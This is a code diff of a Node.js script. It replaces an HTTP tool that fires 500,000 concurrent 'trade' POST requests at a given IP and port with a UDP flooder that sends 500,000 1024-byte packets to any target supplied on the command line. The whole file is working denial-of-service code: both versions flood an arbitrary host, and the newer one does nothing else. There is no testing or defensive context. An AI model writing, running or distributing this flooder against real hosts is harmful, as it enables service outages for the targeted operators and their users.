@@ -1,59 +1,41 @@
-const { execSync } = require('child_process');
+const dgram = require('dgram');
+const process = require('process');
 
-// ฟังก์ชันตรวจสอบและติดตั้งโมดูล
-function ensureModule(module) {
-    try {
-        require.resolve(module);
-    } catch (e) {
-        console.log(`กำลังติดตั้งโมดูล: ${module} ...`);
-        execSync(`npm install ${module}`, { stdio: 'inherit' });
-    }
-}
-
-// ตรวจสอบและติดตั้งโมดูลที่จำเป็น
-ensureModule('axios');
-
-const axios = require('axios');
-
-// ฟังก์ชันสำหรับส่งคำขอเทรด
-async function sendTradeRequest(ip, port, tradeId) {
-    const url = `http://${ip}:${port}/trade`; // เปลี่ยน URL ตามที่คุณต้องการ
-    const tradeData = {
-        id: tradeId,
-        amount: 1000, // ตัวอย่างจำนวนเงินที่ต้องการเทรด
-    };
-
-    try {
-        const response = await axios.post(url, tradeData);
-        console.log(`Trade ${tradeId} ส่งสำเร็จ:`, response.data);
-    } catch (error) {
-        console.error(`Trade ${tradeId} ส่งไม่สำเร็จ:`, error.message);
-    }
-}
-
-// ฟังก์ชันสำหรับส่งเทรด 500,000 ครั้ง
-async function sendBulkTrades(ip, port, totalTrades) {
-    const promises = [];
-
-    for (let i = 1; i <= totalTrades; i++) {
-        promises.push(sendTradeRequest(ip, port, i));
-    }
-
-    // รอให้ทุกคำขอส่งเสร็จ
-    await Promise.all(promises);
-    console.log(`ส่ง ${totalTrades} เทรดเสร็จสิ้น`);
-}
-
-// รับ IP และ PORT จากคำสั่ง
-const args = process.argv.slice(2);
-if (args.length !== 2) {
-    console.error('โปรดระบุ IP และ PORT เช่น: node main.js <IP> <PORT>');
+if (process.argv.length < 4) {
+    console.log(`Usage: node ${process.argv[1]} <IP> <PORT>`);
     process.exit(1);
 }
 
-const ip = args[0];
-const port = args[1];
-const totalTrades = 500000; // จำนวนเทรดที่ต้องการส่ง
+const targetIP = process.argv[2];
+const targetPort = parseInt(process.argv[3]);
+const packetSize = 1024;
+const packetCount = 500000;
 
-// เริ่มต้นส่งเทรด
-sendBulkTrades(ip, port, totalTrades);
+const client = dgram.createSocket('udp4');
+const message = Buffer.alloc(packetSize, 'X');
+
+let sentPackets = 0;
+
+function sendPacket() {
+    if (sentPackets >= packetCount) {
+        console.log('Finished sending packets.');
+        client.close();
+        return;
+    }
+
+    client.send(message, targetPort, targetIP, (err) => {
+        if (err) {
+            console.error(`Error sending packet: ${err.message}`);
+        }
+    });
+
+    sentPackets++;
+    if (sentPackets % 10000 === 0) {
+        console.log(`Sent ${sentPackets} packets...`);
+    }
+
+    setImmediate(sendPacket);
+}
+
+console.log(`Sending ${packetCount} packets to ${targetIP}:${targetPort}...`);
+sendPacket();
